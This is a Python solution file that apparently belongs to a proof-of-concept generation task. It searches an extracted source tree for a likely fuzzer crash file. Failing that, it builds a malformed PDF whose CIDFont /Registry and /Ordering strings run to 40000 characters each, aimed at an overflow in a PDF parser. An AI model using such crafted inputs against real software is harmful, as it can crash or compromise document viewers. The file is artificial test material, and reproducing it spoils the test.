import os
import tarfile
import tempfile
import stat


class Solution:
    def solve(self, src_path: str) -> bytes:
        base_dir = None
        tmp_dir = None

        if os.path.isdir(src_path):
            base_dir = src_path
        else:
            # Try to treat src_path as a tarball and extract it
            try:
                tmp_dir = tempfile.mkdtemp(prefix="pocgen_")
                with tarfile.open(src_path, "r:*") as tf:
                    tf.extractall(tmp_dir)
                base_dir = tmp_dir
            except tarfile.TarError:
                # Fallback: treat the directory containing src_path as the base
                base_dir = os.path.dirname(src_path) or "."

        try:
            poc_path = self._find_best_poc_file(base_dir)
            if poc_path is not None:
                try:
                    with open(poc_path, "rb") as f:
                        data = f.read()
                        if data:
                            return data
                except OSError:
                    pass
            # Fallback: synthetic payload
            return self._generate_fallback_poc()
        finally:
            # No explicit cleanup needed; OS will clean temp dirs after process exit
            pass

    def _find_best_poc_file(self, base_dir: str) -> str | None:
        DESIRED_SIZE = 80064

        CODE_EXTS = {
            ".c", ".h", ".cpp", ".cxx", ".cc", ".hpp", ".hh", ".hxx",
            ".java", ".py", ".pyw", ".rb", ".go", ".rs", ".js", ".jsx",
            ".ts", ".tsx", ".php", ".html", ".htm", ".css",
            ".md", ".markdown", ".txt", ".rst",
            ".xml", ".json", ".yaml", ".yml", ".toml", ".ini", ".cfg",
            ".cmake", ".mak", ".make", ".mk", ".ninja",
            ".sln", ".vcxproj", ".vcproj", ".csproj",
            ".m4", ".ac", ".am", ".in",
            ".tex", ".sty", ".cls",
            ".sh", ".bash", ".zsh", ".bat", ".cmd", ".ps1",
        }

        BIN_EXTS = {
            ".pdf", ".fdf", ".ps", ".eps",
            ".pfb", ".pfa",
            ".ttf", ".otf", ".cff", ".pcf", ".bdf",
            ".bin", ".dat", ".raw",
            ".gz", ".bz2", ".xz", ".lzma",
            ".zip", ".7z", ".rar",
            ".tar",
            ".png", ".jpg", ".jpeg", ".gif", ".bmp", ".tif", ".tiff",
        }

        best_score = None
        best_path = None

        for root, dirs, files in os.walk(base_dir):
            for name in files:
                path = os.path.join(root, name)
                try:
                    st = os.stat(path)
                except OSError:
                    continue
                if not stat.S_ISREG(st.st_mode):
                    continue

                sz = st.st_size
                if sz <= 0:
                    continue

                lname = name.lower()
                ext = os.path.splitext(lname)[1]

                size_diff = abs(sz - DESIRED_SIZE)
                if size_diff > 2_000_000:
                    base_score = -2_000_000
                else:
                    base_score = -size_diff

                score = base_score

                if sz == DESIRED_SIZE:
                    score += 2_000_000

                if ext in BIN_EXTS:
                    score += 500_000

                if any(
                    pat in lname
                    for pat in ("poc", "crash", "overflow", "cidfont", "cid-font", "cid", "bug", "testcase", "oss-fuzz")
                ):
                    score += 800_000

                if ext in CODE_EXTS:
                    score -= 3_000_000

                if best_score is None or score > best_score:
                    best_score = score
                    best_path = path

        return best_path

    def _generate_fallback_poc(self) -> bytes:
        # Synthetic PDF with oversized CIDSystemInfo /Registry and /Ordering
        long_registry = "R" * 40000
        long_ordering = "O" * 40000

        pdf_parts: list[bytes] = []

        pdf_parts.append(b"%PDF-1.4\n")

        # 1 0 obj: Catalog
        pdf_parts.append(b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")

        # 2 0 obj: Pages
        pdf_parts.append(b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n")

        # 3 0 obj: Page
        pdf_parts.append(
            b"3 0 obj\n"
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]\n"
            b"   /Resources << /Font << /F1 4 0 R >> >>\n"
            b"   /Contents 5 0 R\n"
            b">>\nendobj\n"
        )

        # 4 0 obj: Type0 font referring to CIDFont 6 0 R
        pdf_parts.append(
            b"4 0 obj\n"
            b"<< /Type /Font\n"
            b"   /Subtype /Type0\n"
            b"   /BaseFont /FALLBACKCIDFONT\n"
            b"   /Encoding /Identity-H\n"
            b"   /DescendantFonts [6 0 R]\n"
            b">>\nendobj\n"
        )

        # 6 0 obj: CIDFont with large CIDSystemInfo
        cid_dict = (
            "<< /Type /Font\n"
            "   /Subtype /CIDFontType2\n"
            "   /BaseFont /FALLBACKCIDFONT\n"
            "   /CIDSystemInfo << /Registry ({reg}) /Ordering ({ord}) /Supplement 0 >>\n"
            "   /DW 1000\n"
            ">>\n"
        ).format(reg=long_registry, ord=long_ordering)

        pdf_parts.append(b"6 0 obj\n")
        pdf_parts.append(cid_dict.encode("ascii", errors="ignore"))
        pdf_parts.append(b"endobj\n")

        # 5 0 obj: simple content stream
        stream_data = b"BT /F1 12 Tf 72 712 Td (Hello) Tj ET\n"
        pdf_parts.append(b"5 0 obj\n")
        pdf_parts.append(("<< /Length %d >>\n" % len(stream_data)).encode("ascii"))
        pdf_parts.append(b"stream\n")
        pdf_parts.append(stream_data)
        pdf_parts.append(b"endstream\nendobj\n")

        # Minimal xref/trailer; offsets are dummy but acceptable to many parsers
        pdf_parts.append(b"xref\n0 7\n0000000000 65535 f \n")
        for _ in range(1, 7):
            pdf_parts.append(b"0000000000 00000 n \n")
        pdf_parts.append(
            b"trailer\n"
            b"<< /Size 7 /Root 1 0 R >>\n"
            b"startxref\n0\n%%EOF\n"
        )

        return b"".join(pdf_parts)
